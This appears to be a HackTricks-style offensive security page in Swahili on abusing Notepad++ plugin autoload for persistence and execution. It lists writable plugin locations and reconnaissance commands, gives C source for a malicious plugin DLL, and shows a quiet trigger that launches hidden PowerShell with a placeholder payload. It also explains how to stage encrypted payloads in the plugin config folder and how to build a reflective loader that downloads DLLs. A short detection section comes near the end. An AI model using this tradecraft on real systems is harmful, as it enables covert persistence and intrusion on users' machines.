# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ **hupakia kiotomatiki kila DLL ya plugin inayopatikana ndani ya folda zake ndogo za `plugins`** inapozinduliwa. Kuweka plugin hasidi ndani ya **usakinishaji wowote wa Notepad++ unaoweza kuandikiwa** huwezesha code execution ndani ya `notepad++.exe` kila mara kihariri kinapoanza; hali hii inaweza kutumiwa kwa **persistence**, **initial execution** ya kificho, au kama **in-process loader** ikiwa kihariri kimezinduliwa kikiwa na ruhusa za juu.<sup>[[1]](#references)</sup>

Tangu **Notepad++ 7.6+**, mpangilio unaotarajiwa wa usakinishaji wa mkono ni **folda ndogo moja kwa kila plugin** (`plugins\<PluginName>\<PluginName>.dll`). Katika **portable mode** (uwepo wa `doLocalConf.xml` karibu na `notepad++.exe`), mti mzima wa programu hubaki ndani ya saraka hiyo, hivyo nakala za zana zilizonakiliwa au vifurushi vya zana za admin mara nyingi huwa sehemu rahisi ya utekelezaji inayoweza kuandikiwa na mtumiaji.<sup>[[2]](#references)</sup>

## Maeneo ya plugin yanayoweza kuandikiwa

- Usakinishaji wa kawaida: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (kwa kawaida huhitaji ruhusa za admin ili kuandika).<sup>[[1]](#references)</sup>
- Chaguo zinazoweza kuandikiwa na waendeshaji wenye ruhusa ndogo:<sup>[[1]](#references)</sup>
  - Tumia **portable Notepad++ build** kwenye folda inayoweza kuandikiwa na mtumiaji.
  - Nakili `C:\Program Files\Notepad++` kwenye njia inayodhibitiwa na mtumiaji (kwa mfano, `%LOCALAPPDATA%\npp\`) na uendeshe `notepad++.exe` kutoka hapo.
  - Tafuta **vifurushi vya zana za admin**, nakala za zip zilizofunguliwa, au vifaa vya help-desk ambavyo tayari vina `doLocalConf.xml` na viko nje ya `Program Files`.
- Kila plugin hupata folda yake ndogo ndani ya `plugins` na hupakiwa kiotomatiki wakati wa kuwasha; vipengee vya menyu huonekana chini ya **Plugins**.<sup>[[2]](#references)</sup>

Ukaguzi wa haraka:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Sehemu za kupakia Plugin (primitive za utekelezaji)
Notepad++ inatarajia **functions zilizohamishwa** mahususi. Hizi zote huitwa wakati wa uanzishaji, na hivyo kutoa sehemu nyingi za utekelezaji:<sup>[[1]](#references)</sup>
- **`DllMain`** — huendeshwa mara moja DLL inapopakiwa (sehemu ya kwanza ya utekelezaji).
- **`setInfo(NppData)`** — huitwa mara moja inapopakiwa ili kutoa handles za Notepad++; ni sehemu ya kawaida ya kusajili vipengee vya menyu.
- **`getName()`** — hurejesha jina la plugin linaloonyeshwa kwenye menyu.
- **`getFuncsArray(int *nbF)`** — hurejesha amri za menyu; hata ikiwa hakuna, huitwa wakati wa kuwasha.
- **`beNotified(SCNotification*)`** — hupokea matukio ya Notepad++ / Scintilla (inafaa kuahirisha payloads hadi mtumiaji achukue hatua au tukio la editor litokee).
- **`messageProc(UINT, WPARAM, LPARAM)`** — hushughulikia ujumbe, na inafaa kwa ubadilishanaji mkubwa wa data.
- **`isUnicode()`** — flag ya uoanifu inayokaguliwa wakati wa kupakia.

Exports nyingi zinaweza kutekelezwa kama **stubs**; utekelezaji unaweza kufanyika kutoka `DllMain` au callback yoyote hapo juu wakati wa autoload.

## Muundo msingi wa plugin hasidi
Compile DLL yenye exports zinazotarajiwa na uiweke katika `plugins\\MyNewPlugin\\MyNewPlugin.dll` chini ya folda ya Notepad++ inayoweza kuandikiwa:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Jenga DLL (Visual Studio/MinGW).
2. Unda folda ndogo ya plugin ndani ya `plugins`, kisha weka DLL humo.
3. Washa upya Notepad++; DLL hupakiwa kiotomatiki, na kutekeleza `DllMain` pamoja na callbacks zinazofuata.

## Muundo wa kichocheo chenye kelele ndogo kupitia `beNotified`
Kwa OPSEC, payloads nyingi hazipaswi kuendeshwa kutoka `DllMain`. Muundo tulivu zaidi ni kuruhusu plugin ipakiwe bila matatizo, kisha kuitekeleza tu baada ya tukio halisi la kihariri kama vile **kukamilika kwa kuwasha**, **kuwashwa kwa buffer**, au **kuandikwa kwa herufi ya kwanza**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

Hii inalingana na utafiti wa public offensive kuliko beacon ya `DllMain` inayovutia umakini: DLL bado hupakiwa kiotomatiki wakati wa startup, lakini kitendo hasidi hucheleweshwa hadi Notepad++ ionekane inatumika kweli.

## Kutumia directory ya plugin config kama hifadhi ya ziada
Notepad++ hutoa `NPPM_GETPLUGINSCONFIGDIR`, ambayo hurejesha **directory ya usanidi wa plugin ya mtumiaji wa sasa**.<sup>[[3]](#references)</sup> Plugin hasidi inaweza kutumia hii kuweka DLL iliyo kwenye diski kuwa ndogo, huku ikihifadhi config iliyosimbwa kwa njia fiche, payload zilizowekwa tayari, au files za tasking katika path inayochanganyika na hali ya kawaida ya plugin.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Kiutendaji, hii ni muhimu unapotaka:
- DLL ndogo ya bootstrap inayopakiwa kiotomatiki;
- tasking kwa kila mtumiaji bila kugusa tena binary kuu ya plugin;
- kutenganisha **kichochezi cha upakiaji kiotomatiki** na hatua ya pili nzito zaidi.

## Muundo wa plugin ya reflective loader
Plugin iliyowekewa uwezo wa kushambulia inaweza kugeuza Notepad++ kuwa **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Onyesha UI/ingizo la menyu dogo (kwa mfano, "LoadDLL").
- Pokea **file path** au **URL** ya kupakua payload DLL.
- Ramani DLL ndani ya mchakato wa sasa kwa njia ya reflective na uite sehemu ya kuanzia iliyosafirishwa (kwa mfano, function ya loader ndani ya DLL iliyopakuliwa).
- Faida: tumia tena mchakato wa GUI unaoonekana halali badala ya kuanzisha loader mpya; payload hurithi kiwango cha integrity cha `notepad++.exe` (ikiwemo mazingira yenye ruhusa za juu).
- Mabadilishano: kuweka **unsigned plugin DLL** kwenye diski huonekana wazi; njia mbadala ya vitendo ni kutumia plugin inayopakiwa kiotomatiki kama stub pekee, na kuhifadhi implant halisi ikiwa imesimbwa kwa njia fiche/imewekwa hatua nyingine.

## Maelezo ya utambuzi na uimarishaji wa usalama
- Zuia au fuatilia **maandishi kwenye saraka za plugin za Notepad++** (ikiwemo nakala zinazobebeka kwenye wasifu wa watumiaji); washa controlled folder access au uorodheshaji wa programu zinazoruhusiwa.
- Weka arifa kuhusu **DLL mpya zisizosainiwa** chini ya `plugins`, mabadiliko kwenye miti ya Notepad++ inayobebeka, na **child processes/shughuli za mtandao** zisizo za kawaida kutoka kwa `notepad++.exe`.
- Weka rekodi msingi ya plugin halali na uchunguze DLL yoyote mpya inayotoa interface ya kawaida ya plugin ya Notepad++ lakini pia inayoanzisha shell, PowerShell au network beacon.
- Tekeleza usakinishaji wa plugin kupitia **Plugins Admin** pekee, na uzuie utekelezaji wa nakala zinazobebeka kutoka kwenye njia zisizoaminika.

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
